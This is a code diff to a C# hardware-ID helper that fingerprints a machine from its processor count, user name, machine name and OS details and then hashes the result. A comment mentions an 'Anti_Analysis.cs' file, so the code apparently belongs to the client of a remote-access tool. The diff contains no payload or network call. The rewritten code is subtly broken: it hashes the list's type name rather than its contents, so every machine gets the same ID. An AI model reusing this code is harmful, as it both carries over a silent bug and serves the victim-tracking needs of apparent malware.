@@ -1,9 +1,6 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
-using System.IO;
-using System.Linq;
-using System.Security.Cryptography;
-using System.Text;
+using System.Diagnostics;
 
 namespace Client.Helper
 {
@@ -13,25 +10,30 @@ namespace Client.Helper
         {
             try
             {
-                return GetHash(string.Concat(Environment.ProcessorCount, Environment.UserName,
-                    Environment.MachineName, Environment.OSVersion
-                    , new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize));
+                List<string> Props = new List<string>();
+
+                Props.Add(Environment.ProcessorCount.ToString());
+                Props.Add(Environment.UserName);
+                Props.Add(Environment.MachineName);
+                Props.Add(Environment.OSVersion.ToString());
+                Props.Add(Environment.Is64BitOperatingSystem.ToString());
+                //Maybe add some hardware checks? such as those in Anti_Analysis.cs
+
+                string Concat = Props.ToString();
+
+                //If we want to be more precise, we can increase the max val
+                return Truncate(Algorithm.Sha256.ComputeHash(Concat), 20);
             }
-            catch
+            catch(Exception ex)
             {
-                return "Err HWID";
+                Debug.WriteLine(ex);
+                return "UNKNOWN";
             }
         }
-
-        public static string GetHash(string strToHash)
+        public static string Truncate(this string text, int maxLength)
         {
-            MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
-            byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
-            bytesToHash = md5Obj.ComputeHash(bytesToHash);
-            StringBuilder strResult = new StringBuilder();
-            foreach (byte b in bytesToHash)
-                strResult.Append(b.ToString("x2"));
-            return strResult.ToString().Substring(0, 20).ToUpper();
+            if (string.IsNullOrEmpty(text)) { return text; }
+            return text.Substring(0, Math.Min(text.Length, maxLength));
         }
     }
 }
